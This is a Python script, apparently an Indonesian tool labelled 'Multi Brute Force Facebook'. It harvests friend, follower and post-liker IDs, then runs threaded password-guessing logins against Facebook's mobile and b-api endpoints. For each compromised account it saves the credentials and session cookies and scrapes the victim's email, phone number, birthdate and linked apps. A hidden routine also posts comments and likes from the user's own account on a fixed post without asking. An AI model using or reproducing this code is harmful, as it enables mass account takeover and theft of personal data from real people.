#!/usr/bin/env python3
import requests, time, os, re, json, random,bs4,json,sys,random,datetime
from rich.panel import Panel
from rich import print
from rich.tree import Tree
from rich.console import Console
import threading
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
try:ugen = open('user.txt','r').read().splitlines()
except:ugen = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']
try:ugen2 = open('user2.txt','r').read().splitlines()
except:ugen2 = ['Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1','Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30','Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16']

id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]

x = '\33[m' # DEFAULT
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
P = '\033[0;00m'
J = '\033[0;33m'
S = '\033[0;00m'
N = '\x1b[0m'
I ='\033[0;32m'
C ='\033[0;36m'
M ='\033[0;31m'
U ='\033[0;35m'
K ='\033[0;33m'
P='\033[00m'
h='\033[0;90m'
Q="\033[00m"
kk='\033[0;32m'
ff='\033[0;36m'
G='\033[0;36m'
p='\033[00m'
h='\033[0;90m'
Q="\033[00m"
I='\033[0;32m'
II='\033[0;36m'
m='\033[0;31m'
O ='\033[0;33m'
H='\033[0;33m'
b = '\033[0;36m'
war = "[•]"
B = random.choice([U,I,K,b,M])

dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'Juli','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

### LIST DUMP ###
Dump = []
### BANNER OR LOGO ###
def banner_logo():
    os.system('cls' if os.name == 'nt' else 'clear') # Coded by Rozhak
    Console(width=50, style="bold hot_pink2").print(Panel("""[bold red]●[bold yellow] ●[bold green] ●
[bold red]    .-.  .-..----. .----.    .----..----.  
[bold red]    }  \/  {| {_} }} |__}___ } |__}| {_} } 
[bold white]    | {  } || {_} }} '_}{___}} '_} | {_} } 
[bold white]    `-'  `-'`----' `--'      `--'  `----'  
[bold blue]        \\|[bold green]Multi Brute Force Facebook[bold blue]|/""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] Version 8.0 [bold green]<[bold yellow]<[bold red]<"))
    return 0
### DAPATKAN NAMA ###
balmond = O+"["+J+"•"+O+"]"
def dapatkan_nama(cookie, token_eaag):
    with requests.Session() as r:
        r.headers.update({
            'host': 'graph.facebook.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 12; M2010J19SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
            'cookie': cookie
        })
        response = r.get('https://graph.facebook.com/v15.0/me/?fields=id,name&access_token={}'.format(token_eaag)).json()
        if 'name' in str(response) and 'id' in str(response):
            return response['name'].title(), response['id']
        else:
            Console(width=50, style="bold hot_pink2").print(Panel("[italic red]Gagal Akses Graph Facebook, Kemungkinan Cookies Facebook Sudah Kadaluarsa!", title="[bold hot_pink2]([bold blue]Token Invalid[bold hot_pink2])"));time.sleep(3.2);login_cookie()
### LOGIN USING COOKIE ###
def login_cookie():
    try:
        banner_logo()
        Console(width=50, style="bold hot_pink2").print(Panel("""[bold green]1[bold white]. Login Menggunakan Cookie Facebook
[bold green]2[bold white]. Cara Mendapatkan Cookie Facebook
[bold green]3[bold white]. Keluar ([bold red]Logout[bold white])""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Login Using Cookie) [bold green]<[bold yellow]<[bold red]<"))
        query = Console().input("[bold hot_pink2]   ╰─> ")
        if query == '1' or query == '01':
            Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan[italic green] Cookie[italic white], Gunakan Tumbal Untuk Login Dan Pastikan Tidak Terkena[italic yellow] Checkpoint[italic white]!", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
            cookie = Console().input("[bold hot_pink2]   ╰─> ")
            with requests.Session() as r:
                r.headers.update({
                    'cookie': cookie,
                    'user-agent': 'Mozilla/5.0 (Linux; Android 12; M2010J19SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
                    'host': 'business.facebook.com'
                })
                response3 = r.get('https://business.facebook.com/business_locations').text
                token_eaag = re.search('(EAAG\w+)', str(response3)).group(1)
                name, id = dapatkan_nama(cookie, token_eaag)
                Console(width=50, style="bold hot_pink2").print(Panel(f"""[bold white]Nama :[bold green] {name}
[bold white]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Welcome) [bold green]<[bold yellow]<[bold red]<"));bot_komen(cookie, token_eaag)
                open('Data/Cookie.json', 'w').write(json.dumps({'Cookie': cookie}));open('Data/Token.json', 'w').write(json.dumps({'Token': token_eaag}));time.sleep(3.6);setting()
        elif query == '2' or query == '02':
            try:
                Console().print("[bold hot_pink2]   ╰─>[bold green] Kamu Akan Diarahkan Ke Youtube!", end='\r');time.sleep(3.6);os.system("xdg-open https://www.youtube.com/watch?v=3Y6xsMB3wRg");exit()
            except:exit()
        elif query == '3' or query == '03':
            Console().print("[bold hot_pink2]   ╰─>[bold yellow] Keluar Dari Tools!", end='\r');time.sleep(3.6);exit()
        else:
            Console().print("[bold hot_pink2]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r');time.sleep(3.6);login_cookie()
    except Exception as e:
        Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
### BOT KOMEN ###
def bot_komen(cookie, token_eaag):
    with requests.Session() as r: # Kagak Usah Di Ganti, Anggap Saja Sebagai Tanda Terimakasih :V
        text = random.choice(
            ['Keren Bang 😎','Hello World!','Mantap Bang ☺️','I Love You ❤️','Hai Bang 😘']
        )
        r.cookies.update({
            'cookie': cookie
        })
        response = r.post('https://graph.facebook.com/10160350353143544/comments/?message={}&access_token={}'.format(text, token_eaag)).text # Jangan Di Ganti!
        response2 = r.post('https://graph.facebook.com/10160350353143544/likes?summary=true&access_token={}'.format(token_eaag)).text # Jangan Di Ganti!
        if "\"id\":\"" in str(response) and str(response2) == 'true':
            return 0
        else:
            return 1
        
### DUMP ###
def dump_publik():
        try:
            token = open('.token.txt','r').read()
        except IOError:
            exit()
        win = '# DUMP ID PUBLIK'
        win2 = mark(win, style='cyan')
        sol().print(win2)
        print(x+'['+h+'•'+x+'] Ketik "me" Jika Ingin Dump ID Dari Teman')
        pil = input(x+'['+p+'f'+x+'] Masukkan ID Facebook : ')
        try:
            koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
            for pi in koh2['friends']['data']:
                try:id.append(pi['id']+'|'+pi['name'])
                except:continue
                print(x+'['+h+'•'+x+'] Total : '+str(len(id)))
                setting()
        except requests.exceptions.ConnectionError:
            li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
            lo = mark(li, style='red')
            sol().print(lo, style='cyan')
            exit()
        except (KeyError,IOError):
            teks = '# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK'
            teks2 = mark(teks, style='red')
            sol().print(teks2)
            exit()
    ### DUMP PENGIKUT ###
def pengikut(self, userid, cookie, token_eaag):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'host': 'graph.facebook.com',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
                    'cookie': cookie
                })
                response = r.get('https://graph.facebook.com/v1.0/{}/subscribers?access_token={}&pretty=1&fields=id%2Cname&limit=5000'.format(userid, token_eaag)).json()
                if 'summary' in str(response) and 'name' in str(response):
                    for z in response['data']:
                        try:
                            self.id, self.name = z['id'], z['name'].lower()
                            if str(self.id) in str(Dump):
                                continue
                            else:
                                Console().print(f"[bold hot_pink2]   ╰─>[bold green] Dump {self.id}/{len(Dump)} User         ", end='\r');time.sleep(0.0007)
                                Dump.append(f'{self.id}|{self.name}')
                        except (KeyError):
                            Console().print(f"[bold hot_pink2]   ╰─>[bold red] KeyError!                ", end='\r');time.sleep(3.6);continue
                    return 0
                else:
                    Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] Gagal {userid} User!          ", end='\r');time.sleep(3.6)
                    return 1
        except (KeyboardInterrupt):
            Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
            return 2
    ### DUMP LIKES ###
def likes(self, postid, cookie, token_eaag, after):
        try:
            with requests.Session() as r:
                r.headers.update({
                    'host': 'graph.facebook.com',
                    'user-agent': 'Mozilla/5.0 (Linux; Android 11; RMX2144 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',
                    'cookie': cookie
                })
                response = r.get('https://graph.facebook.com/v1.0/{}/likes/?access_token={}&pretty=1&limit=25&after={}'.format(postid, token_eaag, after)).json()
                if 'id' in str(response) and 'name' in str(response):
                    for z in response['data']:
                        self.id, self.name = z['id'], z['name'].lower()
                        if str(self.id) in str(Dump):
                            continue
                        else:
                            Console().print(f"[bold hot_pink2]   ╰─>[bold green] Dump {self.id}/{len(Dump)} User         ", end='\r');time.sleep(0.0007)
                            Dump.append(f'{self.id}|{self.name}')
                    if '\'after\':' in str(response):
                        self.likes(postid, cookie, token_eaag, after = response['paging']['cursors']['after'])
                    else:
                        return 0
                else:
                    Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] Gagal {postid} User!          ", end='\r');time.sleep(3.6)
                    return 1
        except (KeyboardInterrupt):
            Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
            return 2
def setting():
    try:
        cookie = json.loads(open('Data/Cookie.json', 'r').read())['Cookie']
        token_eaag = json.loads(open('Data/Token.json', 'r').read())['Token']
        name, id = dapatkan_nama(cookie, token_eaag)
        Console(width=50, style="bold hot_pink2").print(Panel(f"""[bold white]Nama :[bold green] {name}
[bold white]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Welcome) [bold green]<[bold yellow]<[bold red]<"))
    except Exception as e:
        Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));time.sleep(3.6);login_cookie()
        Console(width=50, style="bold hot_pink2").print(Panel("""[bold green]1[bold white]. Crack User Dari Publik Or Friends
[bold green]2[bold white]. Crack User Dari Pengikut
[bold green]3[bold white]. Crack User Dari Like Postingan
[bold green]4[bold white]. Keluar ([bold red]Logout[bold white])
[bold green]5[bold white]. Ganti UA""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Crack Facebook) [bold green]<[bold yellow]<[bold red]<")) 
        jh = input(x+'['+p+'•'+x+'] Pilih ╰─> ')
        if jh in ['1','01']:
            dump_publik()
        elif jh in ['2','02']:
            try:
                Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan[italic green] ID Akun Facebook[italic white], Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 757953543,4", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                userid = Console().input("[bold hot_pink2]   ╰─> ")
                for z in userid.split(','):
                    pengikut(z, cookie, token_eaag)
                    if len(Dump) < 50:
                        Console().print("[bold hot_pink2]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit()
                    else:
                        Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
            except Exception as e:
                Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
        elif jh in ['3','03']:
            try:
                Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan ID Postingan, Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 10160334652393544", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
                postid = Console().input("[bold hot_pink2]   ╰─> ")
                for z in postid.split(','):
                    likes(z, cookie, token_eaag, after = '')
                    if len(Dump) < 1:
                        Console().print("[bold hot_pink2]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit()
                    else:
                        Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
            except Exception as e:
                Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
        elif jh in ['4','04']:
            grup()
        elif jh in ['5','05']:
            uagent()
        elif jh in ['0','00']:
            os.system('rm -rf .token.txt')
            print(x+'['+h+'•'+x+'] Tunggu ...')
            time.sleep(1)
            sw = '# SUKSES KELUAR'
            sol().print(mark(sw, style='green'))
            exit()
        else:
            ric = '# PILIH YANG BENER LAH BANG'
            sol().print(mark(ric, style='red'))
            exit()
        
        wl = '# SETTING URUTAN ID'
        sol().print(mark(wl, style='cyan'))
        teks = '[01] Crack Dari Akun Tertua [mayan]\n[02] Crack Dari Akun Termuda [Mantap]'
        tak = nel(teks, style='cyan')
        cetak(nel(tak, title='SETTING'))
        hu = input(x+'['+p+'f'+x+'] Pilih : ')
        if hu in ['1','01']:
            for bacot in id:
                id2.append(bacot)
        elif hu in ['2','02']:
            for bacot in id:
                id2.insert(0,bacot)
        else:
            ric = '# PILIHAN TIDAK ADA DI MENU'
            sol().print(mark(ric, style='red'))
            exit()
        met = '# PILIH METHOD CRACK'
        sol().print(mark(met, style='cyan'))
        ioz = '[01] Method B-Api\n[02] Method Mobile\n[03] Method Mbasic Selow Crack'
        gess = nel(ioz, style='cyan')
        cetak(nel(gess, title='METHOD'))
        hc = input(x+'['+p+'f'+x+'] Pilih : ')
        if hc in ['1','01']:
            method.append('api')
        elif hc in ['3','03']:
            method.append('Mbasic')
        else:
            method.append('mobile')
        guw = '# PILIHAN OPSI CRACK '
        sol().print(mark(guw, style='cyan'))
        aplik = input(x+'['+p+'f'+x+'] Tampilkan Aplikasi Terkait ? (y/t) : ')
        if aplik in ['y','Y']:
            taplikasi.append('ya')
        else:
            taplikasi.append('no')
            osk = input(x+'['+p+'f'+x+'] Tampilkan Opsi Checkpoint? [ Not Recommended ] (y/t) : ')
            if osk in ['y','Y']:
                oprek.append('ya')
            else:
                oprek.append('no')
        passwrd()
                
def passwrd():
        ler = '# CRACK DIMULAI'
        sol().print(mark(ler, style='cyan'))
        krek = 'Hasil Ok  Disimpan Ke : OK/%s\nHasil Cp Disimpan Ke : CP/%s\nHidupkan/Matikan Mode Pesawat Setiap 5 Menit'%(okc,cpc)
        cetak(nel(krek, title='CRACK'))
        with tred(max_workers=30) as pool:
            for yuzong in id2:
                idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
                frs = nmf.split(' ')[0]
                pwv = ['sayang','sayangku','sayang123','bismillah','anjing','katasandi','sandi123','malang','bismillah123','123455']
                if len(nmf)<6:
                    if len(frs)<3:
                        continue
                    else:
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                else:
                    if len(frs)<3:
                        pwv.append(nmf)
                    else:
                        pwv.append(nmf)
                        pwv.append(frs+'123')
                        pwv.append(frs+'1234')
                        pwv.append(frs+'12345')
                        if 'mobile' in method:
                            pool.submit(crack,idf,pwv)
                        elif 'api' in method:
                            pool.submit(crack2,idf,pwv)
                        elif 'free' in method:
                            pool.submit(crack3,idf,pwv)
                        else:
                            pool.submit(crack,idf,pwv)
                            print('')
                            tanya = '# INGIN MENGECEK OPSI HASIL CRACK?'
                            sol().print(mark(tanya, style='cyan'))
                            woi = input(x+'['+p+'f'+x+'] Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
                            if woi in ['y','Y']:
                                cek_opsi()
                            else:
                                exit()
    
    
    ### MAIN ###
def crack(idf,pwv):
        global loop,ok,cp
        bi = random.choice([u,k,kk,b,h,hh])
        pers = loop*100/len(id2)
        fff = '%'
        print('\r%s [RUDAL-XD] %s/%s •_• [OK] %s •_• [CP] %s •_• %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
        ua = random.choice(ugen)
        ua2 = random.choice(ugen2)
        ses = requests.Session()
        for pw in pwv:
            try:
                tix = time.time()
                ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
                dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
                ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
                po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
                if "checkpoint" in po.cookies.get_dict().keys():
                    if 'ya' in oprek:
                        akun.append(idf+'|'+pw)
                        ceker(idf,pw)
                    else:
                        print('\n')
                        statuscp = f'[•] ID       : {idf} [•] PASSWORD : {pw}'
                        statuscp1 = nel(statuscp, style='red')
                        cetak(nel(statuscp1, title='SESI'))
                        open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                        akun.append(idf+'|'+pw)
                        cp+=1
                        break
                elif "c_user" in ses.cookies.get_dict().keys():
                        headapp={"user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"}
                        if 'no' in taplikasi:
                            ok+=1
                            coki=po.cookies.get_dict()
                            kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                            open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                            print('\n')
                            statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}'
                            statusok1 = nel(statusok, style='green')
                            cetak(nel(statusok1, title=' NO SESI'))
                            break
                        elif 'ya' in taplikasi:
                            ok+=1
                            coki=po.cookies.get_dict()
                            kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                            open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                            user=idf
                            infoakun = ""
                            session = requests.Session()
                            get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
                            nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
                            response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
                            response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
                            response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
                            response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
                            try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
                            except:nomer = ""
                            try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
                            except:email=""
                            try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
                            except:ttl=""
                            try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
                            except:teman = ""
                            try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
                            except:pengikut = ""
                            try:
                                tahun = ""
                                cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
                                for nenen in cek_thn:
                                    tahun += nenen+", "
                            except:pass
                            
                            infoakun += (f"[••] Nama Akun       : {nama}\n[••] Jumlah Teman    : {teman}\n[••] Jumlah Pengikut : {pengikut}\n[••] Email Aktif     : {email}\n[••] Nomor Aktif     : {nomer}\n[••] Tahun Akun      : {tahun}\n[••] Tanggal Lahir   : {ttl}\n")
                            hit1, hit2 = 0,0
                            cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
                            cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
                            if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
                                infoakun += (f"Aplikasi Yang Terkait*\n")
                                if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
                                    infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
                                else:
                                    infoakun += (f"	Aplikasi Aktif : \n")
                                    apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
                                    ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
                                    for muncul in apkAktif:
                                        hit1+=1
                                        infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
                                        hit2+=1
                                        if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
                                            infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
                                        else:
                                            hit1,hit2=0,0
                                            infoakun += (f"	Aplikasi Kedaluwarsa :\n")
                                            apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
                                            kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
                                            for muncul in apkKadaluarsa:
                                                hit1+=1
                                                infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
                                                hit2+=1
                                                
                            else:pass
                            print('\n')
                            statusok = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}\n{infoakun}'
                            statusok1 = nel(statusok, style='green')
                            cetak(nel(statusok1, title='OK'))
                            break
                        else:
                            continue
                        
            except requests.exceptions.ConnectionError:
                time.sleep(31)
                loop+=1
    
def crack2(idf,pwv):
    global loop,ok,cp
    bi = random.choice([u,k,kk,b,h,hh])
    pers = loop*100/len(id2)
    fff = '%'
    print('\r%s---> %s/%s ---> ok*%s ---> cp*%s ---> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
    ua = random.choice(ugen).replace('\n','')
    ses = requests.Session()
    for pw in pwv:
        try:
            head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
            if "www.facebook.com" in resp.json()["error_msg"]:
                if 'ya' in oprek:
                    akun.append(idf+'|'+pw)
                    ceker(idf,pw)
                else:
                    print('\r%s++++ %s|%s ----> CP       '%(b,idf,pw))
                    open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                    akun.append(idf+'|'+pw)
                    cp+=1
                    break
            elif "session_key" in resp.text and "EAAA" in resp.text:
                    print('\r%s++++ %s|%s ----> OK       '%(h,idf,pw))
                    open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
                    ok+=1
                    break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
            loop+=1

def crack3(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
